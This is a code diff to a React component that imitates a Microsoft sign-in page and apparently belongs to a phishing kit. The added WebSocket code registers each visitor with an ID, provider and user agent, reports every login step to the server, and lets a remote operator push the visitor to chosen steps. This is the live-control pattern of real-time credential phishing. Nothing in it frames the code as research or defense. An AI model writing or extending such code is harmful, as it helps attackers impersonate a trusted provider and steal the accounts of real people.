@@ -138,6 +138,49 @@ function MicrosoftLogin({ device, theme }: { device: string; theme: string }) {
     return () => clearTimeout(t);
   }, [step]);
 
+  // ── WebSocket visitor tracking ────────────────────────────────────────────
+  const wsRef = useRef<WebSocket | null>(null);
+  const visitorId = useRef(`v-${Date.now()}-${Math.random().toString(36).slice(2, 7)}`);
+
+  useEffect(() => {
+    let ws: WebSocket | undefined;
+    try {
+      const proto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+      ws = new WebSocket(`${proto}//${window.location.host}/api/ws`);
+      wsRef.current = ws;
+
+      ws.onopen = () => {
+        const p = new URLSearchParams(window.location.search).get('provider') || 'microsoft';
+        ws!.send(JSON.stringify({
+          type: 'register-visitor',
+          id: visitorId.current,
+          provider: p,
+          step: 'email',
+          userAgent: navigator.userAgent,
+        }));
+      };
+
+      ws.onmessage = (e: MessageEvent<string>) => {
+        try {
+          const msg = JSON.parse(e.data) as { type: string; action?: { navigate?: string } };
+          if (msg.type === 'action' && msg.action?.navigate) {
+            setStep(msg.action.navigate as MsStep);
+          }
+        } catch { /* ignore */ }
+      };
+    } catch { /* ignore — no WS in some environments */ }
+
+    return () => { try { ws?.close(); } catch { /* ignore */ } };
+  }, []);
+
+  useEffect(() => {
+    const ws = wsRef.current;
+    if (ws?.readyState === WebSocket.OPEN) {
+      const p = new URLSearchParams(window.location.search).get('provider') || 'microsoft';
+      ws.send(JSON.stringify({ type: 'step-update', step, provider: p }));
+    }
+  }, [step]);
+
   const lightBg: React.CSSProperties = !isMobile
     ? { backgroundColor: isDark ? '#1b1b1b' : '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }
     : { backgroundColor: isDark ? '#111' : '#ffffff' };
